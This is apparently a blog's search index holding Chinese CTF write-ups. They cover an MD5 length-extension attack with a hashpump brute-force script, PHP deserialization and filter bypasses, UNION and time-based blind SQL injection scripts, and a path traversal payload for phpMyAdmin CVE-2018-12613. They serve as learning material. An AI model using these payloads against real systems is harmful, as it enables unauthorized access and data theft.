<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[HASH长度扩展攻击]]></title>
    <url>%2F2019%2F11%2F30%2Fmd5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[HASH长度扩展攻击因为遇到了相关题目，下面以md5为例，写一下md5的工作原理和对hash扩展攻击的理解。 md5的工作原理如下图所示 其中笼统的一共可以分为四个部分 *Padding填充 *Length填充长度 *初始化向量 *复杂的函数运算（这里可以忽略） 大体概括：md5是分组加密。加密时以每512bit(64byte=&gt;16个数字)为一组，从第一组开始，与四个固定的初始化向量进行复杂运算，进而得到四个新的向量，再将计算得到的向量作为下一组运算的初始向量继续运算。 但是显而易见我们加密的字符大多数情况下不能正好为64byte，md5以填充的方式解决这个问题。 Padding填充填多少 md5根据消息的长度来确定填充的字节数，由于64byte中最后的8byte用来存储原消息长度，故 填充后消息长度 mod 512 = 448 (512-8*8) bit eg.如果信息是‘message’ -&gt; 7byte -&gt; 56bit，那么就填充392bit。 填啥 使用二进制补位 10000000 … 转成十六进制就是第一个字节是0x80，剩余数据用 0x00 填充。 承上面那个例子，那么这里要填 0x80 + 0x00 *48 填充消息长度 这里需要注意长度是小端存储的，即高字节存放在高地址中。 初始化向量A 01 23 45 67 0x67452301B 89 AB CD EF 0xEFCDAB89C FE DC BA 98 0x98BADCFED 76 54 32 10 0x10325476 以上是四个固定的初始化向量，他们也是小端存储。 再与补位后的消息进行复杂运算后，还是上面的‘message’例子，最终得到的md5值是78e731027d8fd50ed642340b7c9a63b3。 MD5长度扩展攻击MD5拓展攻击正是针对加盐措施的一种升级后的攻击手段，我们可以在不知道盐的情况下得出加盐后的md5的值。但需要在以下条件才能实现： 1.我们要知道salt的长度。(为了能得到正确的填充）2.要知道任意一个由salt加密后的md5值，并且知道没有加盐的明文。3.用户可以提交md5值。 例如我们知道一条信息的MD5值是78e731027d8fd50ed642340b7c9a63b3，我们还同时得知信息长度为7byte，此信息如下图补位（这里的信息可以替换成salt+已知信息，加盐情况下需要知道salt长度） 然后它与初始向量复杂运算，得到 A=0x0231e778B=0x0ed58f7dC=0x0b3442d6D=0xb3639a7c 也就是上面的MD5值。 若在已补位后的消息后继续追加字符串‘admin’， 则会对其再次进行补位成为第二组。 他会把上面得出的这组值作为初始向量，并与他进行复杂运算。这样会得到最终的md5值e53a681a30ff99e3f6522270ca7db244。 这个值是md5（消息+填充+追加消息）。实际上就是md5(message+填充+admin)的值。 原理实现已知salt长度实验吧–让我进去 &lt;?php &lt;html> &lt;body> &lt;pre> $flag = "XXXXXXXXXXXXXXXXXXXXXXX"; $secret = "XXXXXXXXXXXXXXX"; // This secret is 15 characters long for security! $username = $_POST["username"]; $password = $_POST["password"]; if (!empty($_COOKIE["getmein"])) { if (urldecode($username) === "admin" &amp;&amp; urldecode($password) != "admin") { if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) { echo "Congratulations! You are a registered user.\n"; die ("The flag is ". $flag); } else { die ("Your cookies don't match up! STOP HACKING THIS SITE."); } } else { die ("You are not an admin! LEAVE."); } } setcookie("sample-hash", md5($secret . urldecode("admin" . "admin")), time() + (60 * 60 * 24 * 7)); if (empty($_COOKIE["source"])) { setcookie("source", 0, time() + (60 * 60 * 24 * 7)); } else { if ($_COOKIE["source"] != 0) { echo ""; // This source code is outputted here } } &lt;/pre> &lt;h1>Admins Only!&lt;/h1> &lt;p>If you have the correct credentials, log in below. If not, please LEAVE.&lt;/p> &lt;form method="POST"> Username: &lt;input type="text" name="username"> &lt;br> Password: &lt;input type="password" name="password"> &lt;br> &lt;button type="submit">Submit&lt;/button> &lt;/form> &lt;/body> &lt;/html> 分析判断条件 if (urldecode($username) === "admin" &amp;&amp; urldecode($password) != "admin") { if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) 只要user始终为admin,pw的值不为admin就可达成条件 同时已知条件user=admin，pw=admin（secret+adminadmin）的 sample-hash=571580b26c65f306376d4f64e53cb5c7（从cookie得到） 题中给出salt长度为15 这里就可以使用md5扩展攻击，在原基础上添加任意消息即可达成目的。 工具hashpump 因为user值不变，也相当于salt的一部分，所以data直接填admin，salt长度为20（15+5） f599284f8f2116348036a3f46e79c12b传到cookie的getmein里 password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00dwm2由于还有个urldecode,转下码post上去得到flag。 //HashPump下载 git clone https://github.com/bwall/HashPump apt-get install g++ libssl-dev cd HashPump make make install未知salt长度Jarvis OJ–flag在管理员手里 &lt;?php $auth = false; $role = "guest"; $salt = if (isset($_COOKIE["role"])) { $role = unserialize($_COOKIE["role"]);//需要传入被序列化的数据 $hsh = $_COOKIE["hsh"]; if ($role==="admin" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE["role"]))) { //strrve函数反转字符串 $auth = true; } else { $auth = false; } } else { $s = serialize($role); setcookie('role',$s); $hsh = md5($salt.strrev($s)); setcookie('hsh',$hsh); } if ($auth) { echo "&lt;h3>Welcome Admin. Your flag is } else { echo "&lt;h3>Only Admin can see the flag!!&lt;/h3>"; } ?> //只截取了PHP部分 分析代码，flag输出条件是 $role===”admin” &amp;&amp;hsh===md5($salt.strrev($_COOKIE[“role”])) 这里得到$salt.strrev(s:5:”guest”;)的hsh，即$salt.’;"tseug":5:s’的md5值： hsh=3a4727d57463f122833d9e732f94e4e0 以上是已知条件。 满足第一个条件只需要比较时$role开头是admin,接下来的字符是’\0’即可。 结合条件二，就可以这样构造 salt+;"tseug":5:s+padding+;"nimda":5:s 而问题在于我们并不知道salt的长度 ===&gt;可以写脚本爆破(借脚本参考) #!/usr/bin/python # -*- coding=utf -*- import requests,hashpumpy,urllib def webre(): url = 'http://web.jarvisoj.com:32778/' sha = '3a4727d57463f122833d9e732f94e4e0' string0 = ';"tseug":5:s' string1 = ';"nimda":5:s' for i in range(15): digest, message = hashpumpy.hashpump(sha,string0,string1,i) payload ={'role':urllib.quote(message[::-1]), 'hsh':digest} // quote()用于把'\x00'都变成'%00' [::-1]用于反转字符 print(i,payload) html = requests.get(url,cookies=payload).content if 'Welcome' in html: print(html) webre()hashpump库使用说明 hashpump(...) hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message) Arguments: hexdigest(str): Hex-encoded result of hashing key + original_data. original_data(str): Known data used to get the hash result hexdigest. data_to_add(str): Data to append key_length(int): Length of unknown data prepended to the hash Returns: A tuple containing the new hex digest and the new message. &gt;&gt;&gt; hashpumpy.hashpump('ffffffff', 'original_data', 'data_to_add', len('KEYKEYKEY')) ('e3c4a05f', 'original_datadata_to_add')===&gt; 也可以用bp爆破 参考： https://blog.csdn.net/qq1045553189/article/details/87566846 https://err0rzz.github.io/2017/09/18/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>攻击原理</category>
      </categories>
      <tags>
        <tag>HASH</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jarvis OJ WEB WP]]></title>
    <url>%2F2019%2F11%2F13%2FJarvis%20OJ(web)WP%2F</url>
    <content type="text"><![CDATA[jarvis OJ神盾局打开网页是一张图片查看源码发现 base64转码发现后面是shield.jpg尝试一下 index.php发现如下源码 大概就是如果传入的class值不为空 就把这个值赋给g再把g反序列化后赋给x输出将x传入readfile后的值再看一下 shield.php 看见他告诉flag在 pctf.php 里 如果传入的值不为空 且值中不存在.. 且不含/ 和\\才能到file_get_contents函数读取文件 又读了一下showimg.php 这就解释了为什么刚才直接读pctf.php显示FILE NOT FOUND写个脚本 O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}把这个值传入注意！！是class不是之前的img 而且是从原页面上传入 得到flag admin看源码啥也没有看一眼robots.txt 进这个文件 发现是假flag抓包admin随便改个值得到flag in a mess查看源码 分析传入的a里如果不为0.则echo hahah并return没有.就继续向下运行 给$data赋值从$a里读到的值如果data值等于 1112 is a nice lab!,id==0,b的长度大于5且b的第一个值是4 又要求b的第一个值不能等于4才能运行flag.txt每个条件都存在冲突id php弱比较就能绕过 传入id=0ea 看见file_get_contents函数想到文件包含 不知道有什么文件含这个字符串先放一下b eregi可以%00截断 b=%0041111111查了下大佬的wp说a这里可以应用伪协议php://input构造payload:?id=0e&amp;a=php://input&amp;b=%004111111同时post值1112 is a nice lab!得到这样的回显Come ON!!! {/^HT2mCpcvOLf} 盲猜他是个地址（长得也太难认了8 进到这样一个界面 看见这样的形势 先测试一下sql注入 确实是sql注入可以看到它这里是过滤了空格 用/*22*/绕过 回显又正常了 先测试字段数 说明字段为3 双写绕过对select和union的过滤数据库名 ?id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,database()查到数据库名是test 表名 id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(table_name)/*22*/frfromom/*22*/information_schema.tables/*22*/where/*22*/table_schema=database() 列名 id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(column_name)/*22*/frfromom/*22*/information_schema.columns/*22*/where/*22*/table_schema=database()/*22*/and/*22*/table_name=0x636f6e74656e74查出来是id,context,title 读文件 id=-1/*22*/uniunionon/*22*/seleselectct/*22*/1,2,context/*22*/frofromm/*22*/content得到flag 持续更新 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>ctfweb</category>
      </categories>
      <tags>
        <tag>jarvis OJ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF WEB wp]]></title>
    <url>%2F2019%2F10%2F21%2FBUUCTFwp%2F</url>
    <content type="text"><![CDATA[BUUCTF WEBwp HCTF2018WarmUp 菜鸡发现了一个平台BUUCTF，web第一题就要去查wp，哎查看源码给了source.php,如下 &lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = ["source"=>"source.php","hint"=>"hint.php"]; if (! isset($page) || !is_string($page)) { echo "you can't see it"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo "you can't see it"; return false; } } if (! empty($_REQUEST['file']) ##不能为空 &amp;&amp; is_string($_REQUEST['file']) ##是字符串 &amp;&amp; emmm::checkFile($_REQUEST['file']) ##上面checkfile返回为true ) { include $_REQUEST['file']; exit; } else { echo "&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"; } ?> hint.php flag not here, and flag in ffffllllaaaagggg 题解构造payload:?file=hint.php%253f/../../../../ffffllllaaaagggg传入得到flag 具体为啥这么构造，参考下面的漏洞。 解题过程经过搜索这里是phpmyadmin4.8.1远程文件包含漏洞所以先看懂这个漏洞-&gt;做题 phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）漏洞原理一个攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。攻击者必须经过身份验证，但在这些情况下除外： $_cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码 $_cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码 漏洞成因 在index.php里50-63行 $target_blacklist = array ( 'import.php', 'export.php' ); // If we have a valid target, let's load that script instead if (! empty($_REQUEST['target']) &amp;&amp; is_string($_REQUEST['target']) &amp;&amp; ! preg_match('/^index/', $_REQUEST['target']) &amp;&amp; ! in_array($_REQUEST['target'], $target_blacklist) &amp;&amp; Core::checkPageValidity($_REQUEST['target']) ) { include $_REQUEST['target']; exit; } 满足五个条件：$_REQUEST[‘target’]不为空，是字符串，不以index开头，Core::checkPageValidity($REQUEST[‘target’])为真,则包含参数所指定的文件 代码在libraries\classes\Core.php 443-476行 Core::checkPageValidity public static function checkPageValidity(&amp;$page, array $whitelist = []) { if (empty($whitelist)) { $whitelist = self::$goto_whitelist; } if (! isset($page) || !is_string($page)) { return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } return false; } 分析代码mb_substr:截取字符串（与substr的区别是它可以截取中文）mb_strpos:匹配（同理，可截取中文）可以看到代码中用了两次有关截取?前字符,判断文件名是否在白名单里的操作第一次很好理解，这里不再叙述phpmyadmin团队考虑到target值后会再跟参数，为了能正确包含文件才使用了第二次截取而就在这里出现了漏洞构造payload:target=db_sql.php%253f/../../test.txt浏览器自行解码一次变成:target=db_sql.php%3f/../../test.txt也就是说传入的数据里没？所以这时的$page没被截取，$_page的值依然等于$page继续往下看，先经过函数urldecode一次变成：target=db_sql.php?/../../test.txt这时候截取到问号前即$_page=db_dql.php, 符合条件通过下面的if判断,接着包含参数所指定的文件，即/../../test.txt(关于这个路径我也不知道是咋来的，我猜就是猜的，嗯)，达到读取test.txt的目的 参考： []: https://www.jianshu.com/p/0d75017c154f 持续更新 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>ctfweb</category>
      </categories>
      <tags>
        <tag>BUUCTF</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[insert into]]></title>
    <url>%2F2019%2F08%2F24%2Finsert%20into%2F</url>
    <content type="text"><![CDATA[观察题目 可以看到注入点应该在http头的x-forwarded-for上 这里还把‘，’过滤了 因为把，过滤了 if是用不了这里用select case when..then..else..end代替substr也用不了 但是可以用 from 1 for 1代替为了节约时间，可以先手工查字段长度这里以database()做示范: x-forwarded-for:1’ and case when(length((select database()))&lt;6) then sleep(3) else 0 end and ‘a 可以看到右下的时间，延时了证明条件成立，最后测出database（）的长度为5，其他数据长度也这样测出来。还是以database()为例，如果单个字符测具体字段：x-forwarded-for:1’ and case when(substr((select database()) from 1 for 1)=’w’) then sleep(3) else 0 end and ‘a 当然转成ascii码用二分法更有效率但为了更加方便 这里写一个脚本 !/usr/bin/python -*- coding: UTF-8 -*- import requests import string mystring = string.ascii_letters+string.digits#所有字母和数字的集合 url='http://123.206.87.240:8002/web15/' #查库名 data = "127.0.0.1'+(select case when (substring((database()) from {0} for 1)='{1}') then sleep(5) else 1 end) and '1'='1" #这里的{0}对应的是后面所需要的format里的str[i](str应该是database()) 查出来是web15 #查表名 data = "1'+(case when (substring((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"#查出来时clineip和flag #查字段名 data = "1'+(case when (substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag') from {0} for 1)='{1}') then sleep(4) else 1 end) and '1" #查出来是 flag #查内容 data= "1'+(case when(substring((select flag from flag) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1 " flag = '' for i in range(1,6):#之前得到database()长度为5，但由于substr默认从1开始，所以range设置为1-6 (1,2,3,4,5) 如果不想查把长度设置大一点既可以 for j in mystring: try: headers = {'x-forwarded-for':data.format(str(i),j)}#format格式化输出，把查到的str的每一字符依次赋到{0}里去 res = requests.get(url,headers=headers,timeout=3)#一旦延时超过3s，继续向下执行代码 except requests.exceptions.ReadTimeout:#跳到这里执行，得到所求 flag += j print(flag) break print('The final flag:'+flag) 由于延时不是很稳定 所以很容易出错 多试几次才能有正确答案flag{cdbf14c9551d5be5612f7bb5d2867853}（最好每次只开一个运行 不然出错概率太大） document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>ctfweb</category>
      </categories>
      <tags>
        <tag>bugku</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
</search>
